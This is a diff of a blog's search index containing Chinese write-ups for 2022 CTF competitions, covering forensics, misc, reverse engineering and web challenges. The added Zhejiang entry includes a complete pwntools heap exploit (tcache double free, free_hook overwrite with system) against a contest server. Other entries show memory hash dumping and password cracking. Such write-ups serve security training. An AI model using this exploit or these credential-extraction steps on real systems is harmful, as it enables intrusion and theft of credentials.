@@ -1,130 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>蓝帽杯初赛WP</title>
-    <url>/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/</url>
-    <content><![CDATA[<h1 id="misc-domainhacker"><a href="#misc-domainhacker" class="headerlink" title="misc_domainhacker"></a>misc_domainhacker</h1><p>下载附件，发现是流量分析题，用wireshark打开</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-16573700049682.gif" class="" title="图片">
-
-<p>在这里找到了rar文件，导出后发现需要密码，于是继续探索</p>
-<p>在tcp追踪流13发现了有用信息</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004.gif" class="" title="图片">
-
-<p>阅读拼接进行base64解密试试</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image006.gif" class="" title="图片">
-
-<p>发现了密码，解压压缩包</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image008.gif" class="" title="图片">
-
-<p>发现是mimikatz工具的界面，于是在NTLM这里找到了hash值</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image010.gif" class="" title="图片">
-
-
-
-<h1 id="手机取证-1"><a href="#手机取证-1" class="headerlink" title="手机取证_1"></a>手机取证_1</h1><p>用盘古石阅读器打开，搜索题目给出的图片的名字</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-16573700345378.gif" class="" title="图片">
-
-<p>导出该图片，并查看该图片属性的详细信息，得到分辨率360x360</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004-16573700345389.gif" class="" title="图片">
-
-
-
-<h1 id="手机取证-2"><a href="#手机取证-2" class="headerlink" title="手机取证_2"></a>手机取证_2</h1><p>题目要求是说让我们找到姜总的快递单号，那么试着搜索下关键字姜总</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-165737006076812.gif" class="" title="图片">
-
-<p>果然，在群组聊天中找到了快递单号</p>
-<h1 id="计算机取证-1"><a href="#计算机取证-1" class="headerlink" title="计算机取证_1"></a>计算机取证_1</h1><p>读题发现是内存取证，想到使用工具volatility，第一个要求我们获得taqi7的开机密码，于是用volatility跑跑看，语句：.&#x2F;volatility_2.6_win64_standalone.exe -f 1.dmp –profile&#x3D;Win7SP1x64 hashdump</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-165737008500914.gif" class="" title="图片">
-
-<p>找到了，发现是md5加密过的，md5解密</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004-165737008501015.gif" class="" title="图片">得到开机密码anxinqi
-
-<h1 id="计算机取证-2"><a href="#计算机取证-2" class="headerlink" title="计算机取证_2"></a>计算机取证_2</h1><p>看下题目，要求我们查看进程号，volatility跑一下进程号看看，语句：.&#x2F;volatility_2.6_win64_standalone.exe -f 1.dmp –profile&#x3D;Win7SP1x64 pstree</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-165737010442218.gif" class="" title="图片">
-
-<p>看着这个很可疑，但我并不认识，上网搜一搜MagnetRAMCaptu</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004-165737010442219.gif" class="" title="图片">
-
-<p>看到这里便可以放心提交答案了，查看下pid是2192</p>
-<h1 id="计算机取证-3"><a href="#计算机取证-3" class="headerlink" title="计算机取证_3"></a>计算机取证_3</h1><p>看题发现这个是磁盘性质的取证题了，于是用取证大师</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002.jpg" class="" title="图片">
-
-<p>导出了三个文件，其中就有ppt</p>
-<p>word和ppt需要密码，还有一个是字典，立马想到了爆破，用passfab for word</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004-165737014552022.gif" class="" title="图片">
-
-<p>文档密码是688561，打开没有发现什么，把ppt后缀改成docx也一样进行爆破</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image006-165737014552023.gif" class="" title="图片">
-
-<p>得到密码287fuweiuhfiute，改回后缀，输入密码打开，得到flag</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image008-165737014552024.gif" class="" title="图片">
-
-
-
-<h1 id="计算机取证-4"><a href="#计算机取证-4" class="headerlink" title="计算机取证_4"></a>计算机取证_4</h1><p>在e01文件中bitlocker解密出来，发现tc加密文件，寻找密钥</p>
-<p>根据题目提示，使用取证大师的工具：内存镜像解析工具进行解析</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-165737018007529.gif" class="" title="图片">
-
-<p>导出keyfile</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004-165737018007531.gif" class="" title="图片">
-
-<p>新建案例，开始取证</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image006-165737018007530.gif" class="" title="图片">
-
-<p>发现哈哈哈.zip，导出该zip，直接暴力破解，得到密码991314</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image008-165737018007532.gif" class="" title="图片">
-
-<p>打开压缩包，得到flag</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image010-165737018007533.gif" class="" title="图片">
-
-<p>flag{1349934913913991394cacacacacacc}</p>
-<h1 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析_1"></a>程序分析_1</h1><p> 将文件下载下来，然后将后缀改为”.zip”，拖入winrar中将配置文件AndroidManifest.xml解压出来。</p>
-<p>然后利用工具AXMLPrinter2将配置文件反编译，编译出来的文件内容中可以看到package字段如下图所示</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709190538890.png" class="" title="image-20220709190538890">
-
-<p>所以flag为“exec.azj.kny.d.c”。</p>
-<h1 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析_2"></a>程序分析_2</h1><p>上题反编译出来的配置文件中有如下图所示内容</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709190735776.png" class="" title="image-20220709190735776">
-
-<p>“android.intent.action.MAIN”则代表文集入口“属性”，外面一层的activity标签中的android name值就是入口程序</p>
-<p>所以flag为”minmtta.hemjcbm.ahibyws.MainActivity”.</p>
-<h1 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析_3"></a>程序分析_3</h1><p>将下载下来的文件拖入bytecode viewer中，根据上题的程序入口目录进去，可出现下图所示内容</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709191141536.png" class="" title="image-20220709191141536">
-
-<p>根据代码大致就可以猜测base64解密的内容就是密文。</p>
-<p>所以flag为“aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6”</p>
-<h1 id="程序分析-4"><a href="#程序分析-4" class="headerlink" title="程序分析_4"></a>程序分析_4</h1><p>在bytecode viewer中可以看到很多被混淆加密的包，安全检测类很可能就在里面</p>
-<p>根据关键词查找发现如下内容</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709191504565.png" class="" title="image-20220709191504565">
-
-<p>这应该就是与检测相关的一个类，但起不到检测的作用。再去上级目录看，看到class a中有下图所示关键字段</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709191701294.png" class="" title="image-20220709191701294">
-
-<p>qemu是Android模拟器，用来模拟检测的，所以猜测这个类就是了。</p>
-<p>所以flag为“a”</p>
-<h1 id="网站取证-1"><a href="#网站取证-1" class="headerlink" title="网站取证_1"></a>网站取证_1</h1><p>题目提示有后门</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002.gif" class="" title="图片">
-
-<p>d盾扫描获得flag</p>
-<h1 id="网站取证-2"><a href="#网站取证-2" class="headerlink" title="网站取证_2"></a>网站取证_2</h1><p>查看database.php发现密码与my_encrypt()有关，发现该函数在encrypt.php中将encrypt.php部署到本地环境中跑一下，获得flag</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709202049506.png" class="" title="image-20220709202049506">
-
-
-
-<h1 id="网站取证-3"><a href="#网站取证-3" class="headerlink" title="网站取证_3"></a>网站取证_3</h1><p>在Channelorder.php和Channelorderlist.php中都有盐值即$key</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709202224818.png" class="" title="image-20220709202224818">
-]]></content>
-      <categories>
-        <category>比赛</category>
-        <category>2022</category>
-      </categories>
-      <tags>
-        <tag>取证</tag>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2022DASCTF赋能赛</title>
+    <title>2022DASCTF七月赋能赛</title>
     <url>/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/</url>
     <content><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Ez-to-getflag-题"><a href="#Ez-to-getflag-题" class="headerlink" title="Ez to getflag 题"></a>Ez to getflag 题</h2><p>发现有查询功能，所以一开始查flag无果，转念一想如果是linux服务器的话应该再根目录下，所以在次查询&#x2F;flag，获得flag</p>
 <img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image002.png" class="" title="img">
@@ -243,13 +120,289 @@
 ]]></content>
       <categories>
         <category>比赛</category>
-        <category>2022</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>misc</tag>
+        <tag>web</tag>
+        <tag>Crypto</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2022浙江省ctf初赛</title>
+    <url>/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/</url>
+    <content><![CDATA[<blockquote>
+<p><a href="https://github.com/Eu21ka/pwn-exercises/tree/main/2022%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9B">题目附件下载地址</a></p>
+</blockquote>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>这道题是2.27下的一个tcache利用，因为有UAF，所以很容易的就可以泄露出堆地址。再利用tcache double free可以轻易释放堆块到unsorted bin中去，然后就可以泄露libc地址。然后通过修改fd指针，部署堆块到free hook上，并将其覆盖为onegadget，最后free触发onegadget获得shell。</p>
+<p><strong>EXP：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>(<span class="params">x,file_name</span>):</span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;1.14.97.218&#x27;</span>,<span class="number">22785</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),p,ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">ch</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input your choice: &#x27;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,payload</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;input content: &#x27;</span>,payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">elf,p,libc=conn(<span class="number">0</span>,<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">heap=u64(p.recvline().replace(<span class="string">b&#x27;\n&#x27;</span>,<span class="string">b&#x27;&#x27;</span>)+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x260</span></span><br><span class="line">success(<span class="string">&#x27;heap:&#x27;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line">edit(<span class="number">1</span>,p64(heap+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x7f</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#5</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\x07&#x27;</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">96</span>-<span class="number">0x10</span>-</span><br><span class="line">libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(libc_addr+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#6</span></span><br><span class="line">edit(<span class="number">6</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive(</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这周虚拟机崩了，之前写的脚本也就丢失了，所以就直接拿了别的师傅的exp，和我的攻击思路应该大差不差。</p>
+</blockquote>
+<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="ManyCheck"><a href="#ManyCheck" class="headerlink" title="ManyCheck"></a>ManyCheck</h2><p>第一个检查是猜幸运数字，把程序拖进ida，通过字符串查询“First check”就可以立马定位到如下图所示的函数，然后易得出那个要猜的数字就是<code>77</code></p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/image-20220920204556151.png" class="" title="image-20220920204556151">
+
+<p>第二个检查根据问题敲敲计算器就可以计算出<code>55</code>和<code>49</code>两个答案，程序中的判断如下图所示</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/image-20220920204745404.png" class="" title="image-20220920204745404">
+
+<p>第三个检查依旧可以利用字符串查找来定位到关键函数，可看到下图中的11行就是判断</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/image-20220920204900834.png" class="" title="image-20220920204900834">
+
+<p>最后可以看到如下图所示的运算</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/image-20220920205002693.png" class="" title="image-20220920205002693">
+
+<p>是循环移位，直接用python跑</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x=<span class="number">1718896489</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(x&gt;&gt;<span class="number">16</span>)+((x&amp;(<span class="number">2</span>**<span class="number">16</span>-<span class="number">1</span>))&lt;&lt;<span class="number">16</span>)</span><br><span class="line"><span class="number">1198089844</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="好怪哦"><a href="#好怪哦" class="headerlink" title="好怪哦"></a>好怪哦</h2><p>下载附件，发现是个损坏的压缩包，用winhex打开看看</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image002.gif" class="" title="图片">
+
+<p>发现是都翻转过的16进制，于是用随波逐流进行hex_str翻转</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image004.gif" class="" title="图片">
+
+<p>复制翻转修复好的16进制码，在winhex中还原出新的压缩包</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image006.gif" class="" title="图片">
+
+<p>保存好后打开压缩包，一张损坏的png图片，同样拉进winhex</p>
+<p>发现缺少png文件头，89504E47给它补上</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image008.gif" class="" title="图片">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image010.gif" class="" title="图片">
+
+<p>发现是一半的图片，修改高度得到flag</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image012.gif" class="" title="图片">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image014.gif" class="" title="图片">
+
+<p>DASCTF{f8b275b06baf4204fa62743eab5eca98}</p>
+<h2 id="神奇的棋盘"><a href="#神奇的棋盘" class="headerlink" title="神奇的棋盘"></a>神奇的棋盘</h2><p>下载附件</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image016.gif" class="" title="图片">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image018.gif" class="" title="图片">
+
+<p>看了眼附件，应该是棋盘加密，拿原先的棋盘对比一下</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image020.jpg" class="" title="图片">
+
+<p>对照替换</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image022.jpg" class="" title="图片">
+
+<p>到这里没什么思路了，去看看给的图片有没有隐藏信息，因为是png，所以先想到的是lsb隐写</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image024.jpg" class="" title="图片">
+
+<p>zsteg发现有段base32（stegsolve RGB0通道也可以解出），解出来是个key</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image026.jpg" class="" title="图片">
+
+<p>LastKey{Yusayyds}</p>
+<p>有了key直接随波逐流ADFGVX解密</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image028.jpg" class="" title="图片">
+
+<p>明文进行16进制转换得到flag</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image030.gif" class="" title="图片">
+
+<p>DASCTF{d859c41c530afc1c1ad94abd92f4baf8}</p>
+<h2 id="segmentFlow"><a href="#segmentFlow" class="headerlink" title="segmentFlow"></a>segmentFlow</h2><p>下载附件，八个加密文件</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image032.gif" class="" title="图片">
+
+<p>文件大小都相同，CRC32爆破</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image034.gif" class="" title="图片">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image036.gif" class="" title="图片">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image038.gif" class="" title="图片">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image040.gif" class="" title="图片">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image042.gif" class="" title="图片">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image044.gif" class="" title="图片">
+
+<p>password gZinflAte_BasE64，解压下来流量包，开始分析</p>
+<p>查看协议分级</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image046.gif" class="" title="图片">
+
+<p>追踪tcp流</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image048.gif" class="" title="图片">
+
+<p>在不同的流发现了不同的这样的数据，tshark提取数据</p>
+<p>tshark -r segmentFlow.pcapng -T fields -e urlencoded-form.value | sed ‘&#x2F;^\s*$&#x2F;d’ &gt; 1.txt</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image050.gif" class="" title="图片">
+
+<p>用notepad将,替换成换行符</p>
+<p><img src="E:/笔记/pwn/临时笔记/2022浙江省ctf初赛/clip_image052.gif" alt="图片"></p>
+<p>在这里发现了压缩包的16进制</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image054.gif" class="" title="图片">
+
+<p>将每一段提取出来拼接</p>
+<p>504B03041400000008006EAE86547BF6F39C2A0000002800000008000000666C61672E74787473710C760E71AB364B4D4C49344BB530314C364A4D4E32334E4A4E344834333731B2B0B04C32B0A80500504B01021F001400000008006EAE86547BF6F39C2A00000028000000080024000000000000002000000000000000666C61672E7478740A0020000000000001001800027E256ABD49D801027E256ABD49D8013254A060BD49D801504B050600000000010001005A000000500000000000</p>
+<p>转换为压缩包</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image056.gif" class="" title="图片">
+
+<p>得到flag<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image058.gif" class="" title="图片"></p>
+<p>DASCTF{6eada6e841c2ecb63bca0a6742889b08}</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image002.jpg" class="" title="img">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image004.jpg" class="" title="img">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image006.jpg" class="" title="img">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image007.png" class="" title="img">
+
+
+<h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p>读取规则</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image009.jpg" class="" title="img">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image011.jpg" class="" title="img">
+
+<p>注册时使用Admin盲猜登陆时后台有转小写的函数所以将admin的账号登录成功获得flag</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image013.jpg" class="" title="img">
+
+
+
+<h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><p>游戏类题目两种思路：</p>
+<p>1、 与后端有交互（通过抓包改包更改分数从而获取flag）</p>
+<p>2、 与后端无交互（一般flag隐藏于js代码中，关键字+细心即可找到flag）</p>
+<p>观察发现与后端无传输所以怀疑在前端进入对应的两个js文件找到flag</p>
+<p>此题通过观察找到两个js文件读取获得flag</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image015.jpg" class="" title="img">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image017.jpg" class="" title="img">
+
+<p>解码获得</p>
+]]></content>
+      <categories>
+        <category>比赛</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>misc</tag>
+        <tag>web</tag>
+        <tag>re</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>蓝帽杯初赛WP</title>
+    <url>/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/</url>
+    <content><![CDATA[<h1 id="misc-domainhacker"><a href="#misc-domainhacker" class="headerlink" title="misc_domainhacker"></a>misc_domainhacker</h1><p>下载附件，发现是流量分析题，用wireshark打开</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-16573700049682.gif" class="" title="图片">
+
+<p>在这里找到了rar文件，导出后发现需要密码，于是继续探索</p>
+<p>在tcp追踪流13发现了有用信息</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004.gif" class="" title="图片">
+
+<p>阅读拼接进行base64解密试试</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image006.gif" class="" title="图片">
+
+<p>发现了密码，解压压缩包</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image008.gif" class="" title="图片">
+
+<p>发现是mimikatz工具的界面，于是在NTLM这里找到了hash值</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image010.gif" class="" title="图片">
+
+
+
